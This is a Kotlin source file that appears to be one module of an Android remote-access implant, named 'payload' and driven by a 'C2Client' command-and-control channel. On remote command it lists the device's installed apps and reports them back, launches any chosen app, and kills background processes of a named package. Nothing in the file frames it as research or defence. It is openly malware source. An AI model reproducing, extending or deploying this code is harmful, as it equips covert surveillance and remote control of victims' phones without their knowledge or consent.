package com.ihk909.payload.modules

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import com.ihk909.payload.C2Client
import org.json.JSONArray
import org.json.JSONObject

object AppsModule {
    fun list(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val pm = ctx.packageManager
            val main = Intent(Intent.ACTION_MAIN, null).addCategory(Intent.CATEGORY_LAUNCHER)
            val apps: List<ResolveInfo> = pm.queryIntentActivities(main, 0)
            val arr = JSONArray()
            for (ri in apps) {
                arr.put(JSONObject()
                    .put("pkg", ri.activityInfo.packageName)
                    .put("label", ri.loadLabel(pm).toString()))
            }
            c2.reply(id, JSONObject().put("items", arr))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun launch(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val pkg = args.getString("pkg")
            val i = ctx.packageManager.getLaunchIntentForPackage(pkg)
                ?: throw RuntimeException("no launch intent")
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
            c2.reply(id, JSONObject().put("launched", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun kill(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val pkg = args.getString("pkg")
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.killBackgroundProcesses(pkg)
            c2.reply(id, JSONObject().put("killed", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}